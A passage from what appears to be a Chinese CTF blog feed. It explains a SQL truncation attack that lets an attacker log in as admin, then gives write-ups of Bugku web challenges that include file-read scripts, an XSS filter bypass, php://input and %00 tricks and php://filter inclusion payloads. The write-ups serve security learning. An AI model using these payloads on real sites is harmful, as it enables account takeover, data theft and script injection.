class="string">'username'</span>]);</span><br><span class="line">$password = mysql_real_escape_string($_POST[<span class="string">'password'</span>]);</span><br><span class="line">$sql = <span class="string">"SELECT username FROM users WHERE username='$username'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"><span class="keyword">if</span>($row)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'username has exist'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">$sql = <span class="string">"INSERT INTO users(username,password) values('$username','$password')"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'regist successfully'</span>;</span><br><span class="line">header(<span class="string">'location:login.php'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看似对用户的输入进行了转义的过滤，能防止sql注入，但是我们还是有办法能登录任意已存在的账号</p><p>下面演示具体过程：</p><p>首先先创建一个数据库test，再test库下建立users表，里面的列名为username和password</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql约束攻击/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql约束攻击/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>注意这里对用户名和密码字符串长度限制最大为15位</p><p>接着创建一个管理员身份账户，用户名为admin，密码为123456</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql约束攻击/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后我们以攻击者的身份要以管理员身份登陆，首先注册用户，用户名为admin+若干个空格+1，这里空格在10个以上，原因后面会提到</p><p>这时候我们注册页面首先会进行是否存在注册的用户名的查询</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql约束攻击/4.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>没有查询到结果，所以成功绕过了查询，这里就可以解释一下为什么要在末尾加1，其实1是随便加的，任何字母数字都可以，原因是mysql进行select查询时，会忽略末尾的若干个空格，例如我们执行sql语句：”select username,password from users where username=’admin        ‘ “</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql约束攻击/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>结果跟没有加空格是一样的，那么我们要绕过是否存在用户名的查询，如果只在末尾加空格，是会被检测到存在admin用户，所以我们在末尾加个任意字符，就可以绕过这个查询</p><p>那么为什么空格要在10个以上呢，我们继续看下去</p><p>下面注册页面执行的是insert语句</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql约束攻击/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见成功的注册了</p><p>我们再来查询一下”select username,password from users where username=’admin’ “</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql约束攻击/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>这时候发现有两个admin用户，但是这两个用户其实是不一样的，因为我们之前说过了，mysql在select查询时会将末尾空格忽略，而mysql在insert操作时不会忽略空格，也就是说我们以攻击者身份注册的用户名’admin          1’中的空格不会被省略，这里肯定就有疑问，那么1跑哪里去了，答案很简单，我们之前就已经限制了username的最大长度为15，这里空格在10个以上，加上admin的5个长度，所以长度在15以上的字符就被截断了，之前的才会被写入数据库，那么实际上写入数据库的就是admin+10个空格，但是我们登录查询select语句会自动忽略空格，所以将后面没有空格的admin和加了10个空格的admin都查询了出来</p><p>也就是说，我们在登录页面输入用户名为admin，密码为aaa，就会有查询结果，也就以管理员身份登录成功了</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/sql约束攻击/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>当然我们查询到的并不是真正的admin用户，但是服务器只检测有没有查询结果，有则认为我们登录成功</p><p>那么防御手段也挺简单就能想到，我们只需要对查询的结果进行检查，检查查询到的用户密码是不是之前设置的管理员密码，就可以防御了</p><p>最后附上参考链接：<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html" target="_blank" rel="noopener">https://www.cnblogs.com/ECJTUACM-873284962/p/8977983.html</a></p>]]></content>
    
    <summary type="html">
    
      sql
    
    </summary>
    
      <category term="sql" scheme="https://Foxgrin.github.io/categories/sql/"/>
    
    
      <category term="sql" scheme="https://Foxgrin.github.io/tags/sql/"/>
    
  </entry>
  
  <entry>
    <title>Bugkuctf-Web(2)</title>
    <link href="https://Foxgrin.github.io//posts/26423/"/>
    <id>https://Foxgrin.github.io//posts/26423/</id>
    <published>2018-08-02T14:48:00.000Z</published>
    <updated>2018-08-06T03:45:00.809Z</updated>
    
    <content type="html"><![CDATA[<p>Bugkuctf中的Web题解(二)<a id="more"></a></p><h3 id="cookies欺骗"><a href="#cookies欺骗" class="headerlink" title="cookies欺骗"></a>cookies欺骗</h3><p>网址：<a href="http://120.24.86.145:8002/web11/" target="_blank" rel="noopener">http://120.24.86.145:8002/web11/</a></p><p>进去页面一看是一串乱码，但发现url中包含参数filename=a2V5cy50eHQ=，将a2V5cy50eHQ=进行base64解码得keys.txt，将index.php进行base64加密后赋值给filename参数，同时指定line参数的值为1，发现输出了php代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/54.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>于是猜测line为行数，写个脚本读出index.php的所有代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    url = <span class="string">'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=aW5kZXgucGhw'</span>%i</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.text:</span><br><span class="line">        print(r.text,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">$file=base64_decode(isset($_GET[&apos;filename&apos;])?$_GET[&apos;filename&apos;]:&quot;&quot;);</span><br><span class="line"></span><br><span class="line">$line=isset($_GET[&apos;line&apos;])?intval($_GET[&apos;line&apos;]):0;</span><br><span class="line"></span><br><span class="line">if($file==&apos;&apos;) header(&quot;location:index.php?line=&amp;filename=a2V5cy50eHQ=&quot;);</span><br><span class="line"></span><br><span class="line">$file_list = array(</span><br><span class="line"></span><br><span class="line">&apos;0&apos; =&gt;&apos;keys.txt&apos;,</span><br><span class="line"></span><br><span class="line">&apos;1&apos; =&gt;&apos;index.php&apos;,</span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(isset($_COOKIE[&apos;margin&apos;]) &amp;&amp; $_COOKIE[&apos;margin&apos;]==&apos;margin&apos;)&#123;</span><br><span class="line"></span><br><span class="line">$file_list[2]=&apos;keys.php&apos;;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">if(in_array($file, $file_list))&#123;</span><br><span class="line"></span><br><span class="line">$fa = file($file);</span><br><span class="line"></span><br><span class="line">echo $fa[$line];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>从源代码可以看出，flag在keys.php中，而我们要逐行读取keys.php文件的内容，就必须设置cookie:margin=margin</p><p>直接上脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">'margin'</span>:<span class="string">'margin'</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    url = <span class="string">'http://120.24.86.145:8002/web11/index.php?line=%d&amp;filename=a2V5cy5waHA='</span>%i</span><br><span class="line">    r = requests.get(url,cookies=cookie)</span><br><span class="line">    <span class="keyword">if</span> r.text:</span><br><span class="line">        print(r.text,end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $key=<span class="string">'KEY&#123;key_keys&#125;'</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XSS注入测试"><a href="#XSS注入测试" class="headerlink" title="XSS注入测试"></a>XSS注入测试</h3><p>网址：<a href="http://103.238.227.13:10089/" target="_blank" rel="noopener">http://103.238.227.13:10089/</a></p><p>页面提示我们要注入一段xss代码，看一下源代码</p><p>关键代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> s=<span class="string">""</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'s'</span>).innerHTML = s;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>id为s的是一个为空的div标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"s"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>举个例子说明一下innerHTML</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"baidu"</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">strong</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">document.getElementById("baidu")　获得 a 这个元素</span><br><span class="line">document.getElementById("baidu") .innerHTML　获得 a 这个元素内的HTML代码（即<span class="tag">&lt;<span class="name">strong</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>）</span><br><span class="line">document.getElementById("baidu") .innerHTML = "<span class="tag">&lt;<span class="name">em</span>&gt;</span>谷歌<span class="tag">&lt;/<span class="name">em</span>&gt;</span>"　</span><br><span class="line">设置 a 这个元素内的HTML代码，</span><br><span class="line">设置后<span class="tag">&lt;<span class="name">strong</span>&gt;</span>百度<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">就变为<span class="tag">&lt;<span class="name">em</span>&gt;</span>谷歌<span class="tag">&lt;/<span class="name">em</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这里说明一下如果字符串中拼接的 HTML 标签中有 script 标签，那么该段脚本是无法执行的，这并不是 bug，而是 w3c 的文档规定的 </p><p>再来看看这题，没有给出注入点，按照惯例是id，输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&lt;script&gt;alert(_key_)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>查看源代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> s=<span class="string">"&amp;lt;script&amp;gt;"</span>;<span class="built_in">document</span>.getElementById(<span class="string">'s'</span>).innerHTML = s;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>发现&lt;&gt;被html编码，即被过滤了</p><p>因为页面编码为utf-8，所以可以将&lt;&gt;进行unicode编码，这样当代码被替换进去运行时，utf-8编码又会将其变回来 </p><p>输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e</span><br></pre></td></tr></table></figure><p>返回：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> s=<span class="string">"\u003cscript\u003ealert('Flag:17f094325e90085b30a5ddefce34acd8')\u003c/script\u003e"</span>;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">'s'</span>).innerHTML = s;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>参考：<a href="https://blog.csdn.net/wy_97/article/details/77755098" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/77755098</a></p><h3 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never give up"></a>never give up</h3><p>网址：<a href="http://120.24.86.145:8006/test/hello.php" target="_blank" rel="noopener">http://120.24.86.145:8006/test/hello.php</a></p><p>页面源代码提示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--1p.html--&gt;</span><br></pre></td></tr></table></figure><p>访问<a href="http://120.24.86.145:8006/test/1p.html，发现跳转到其他页面" target="_blank" rel="noopener">http://120.24.86.145:8006/test/1p.html，发现跳转到其他页面</a></p><p>那么访问其源代码view-source:<a href="http://120.24.86.145:8006/test/1p/html" target="_blank" rel="noopener">http://120.24.86.145:8006/test/1p/html</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT LANGUAGE=<span class="string">"Javascript"</span>&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> NewWords;</span><br><span class="line">NewWords = <span class="built_in">unescape</span>(Words);</span><br><span class="line"><span class="built_in">document</span>.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br><span class="line"><span class="comment">// --&gt;</span></span><br><span class="line">&lt;<span class="regexp">/SCRIPT&gt;</span></span><br></pre></td></tr></table></figure><p>关键在于Words这个变量，第一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A%3C%21</span><br></pre></td></tr></table></figure><p>看起来像是被url编码过，url解码后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&apos;http://www.bugku.com&apos;;&lt;/script&gt; </span><br><span class="line">&lt;!--</span><br></pre></td></tr></table></figure><p>后面是被注释的代码：先base64解码后url解码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span><br><span class="line">&#123;</span><br><span class="line">header(<span class="string">'Location: hello.php?id=1'</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line">$a=$_GET[<span class="string">'a'</span>];</span><br><span class="line">$b=$_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'no no no no no no no'</span>;</span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">if</span>($data==<span class="string">"bugku is a nice plateform!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"f4l2a3g.txt"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"never never never give up !!!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看的出来这就是hello.php的源代码，这里出题人没有隐藏文件名，知道了文件名f4l2a3g.txt其实就可以直接访问</p><p>但是按照出题人的意思我们要绕过过滤，首先$data必须为”bugku is a nice plateform”，而$data值取决于函数file_get_contents，这里查询得知php后门技巧，利用php协议input，接收post的信息，经过函数file_get_contents就可以读取出来，所以$a=php://input，然后post字符串”bugku is a nice plateform”</p><p>接着是$id要等于0，但是代码开头如果$id为0则重定向，所以不能为0，利用php弱类型的特性可以给$id赋值0a</p><p>然后$b的检查长度大于5，正则匹配$b第一位必须为4，然而substr()检查$b第一位不能为4，自相矛盾，但是可以利用%00截断eregi函数</p><p>综上GET参数为?id=0a&amp;a=php://input&amp;b=%0012345</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/55.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><h3 id="welcome-to-bugkuctf"><a href="#welcome-to-bugkuctf" class="headerlink" title="welcome to bugkuctf"></a>welcome to bugkuctf</h3><p>网址：<a href="http://120.24.86.145:8006/test1/" target="_blank" rel="noopener">http://120.24.86.145:8006/test1/</a></p><p>进入页面查看源代码，发现提示了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审计后GET参数?txt=php://input，POST数据”welcome to the bugkuctf”</p><p>之后就是文件包含漏洞，提示了hint.php，我们GET参数file=php://filter/read=convert.base64-encode/resource=hint.php查看hint.php的源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/56.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>base64解码后得hint.php源代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>又提示了flag.php，猜测flag就在这里面，再试试能不能读取flag.php的源代码</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/57.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>貌似被过滤了flag.php</p><p>那就看看index.php的源代码吧</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Bugkuctf-Web/58.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>解码后得：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"ä¸è½ç°å¨å°±ç»ä½ flagå¦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br><span class="line">  </span><br><span class="line">&lt;!--  </span><br><span class="line">$user = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$pass = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($user)&amp;&amp;(file_get_contents($user,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello admin!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">include</span>($file); <span class="comment">//hint.php  </span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not admin ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"> --&gt;</span><br></pre></td></tr></table></figure><p>果然文件包含被正则匹配过滤了关键词flag，我们要得到flag就必须读取flag.php文件，怎么办呢，想起来还有hint.php的提示，它定义了一个类，类里定义了一个全局变量$file，如果类对象全局变量有设置值，则用file_get_contents函数读取</p><p>这里还有一个password参数经过反序列化函数unserialize处理，首先要了解这个函数具体的作用，来看一个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 